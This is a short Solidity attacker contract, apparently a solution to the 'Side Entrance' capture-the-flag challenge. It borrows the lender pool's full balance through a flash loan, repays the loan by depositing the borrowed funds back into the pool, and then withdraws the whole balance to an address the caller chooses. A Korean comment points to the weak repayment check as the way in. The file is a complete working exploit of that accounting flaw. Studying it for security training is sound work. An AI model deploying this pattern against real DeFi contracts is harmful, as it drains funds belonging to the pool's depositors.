// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool immutable pool;
    
    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }
    
    function flashLoan() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        // 돌파구: 플래시론 풀의 상환여부 검증 로직이 약함. 이거 한줄이면 우회됨
        pool.deposit{ value: msg.value }();
    }

    function withdrawAll(address payable to) external {
        pool.withdraw();
        to.call{ value: address(this).balance }("");
    }

    receive() external payable { }
}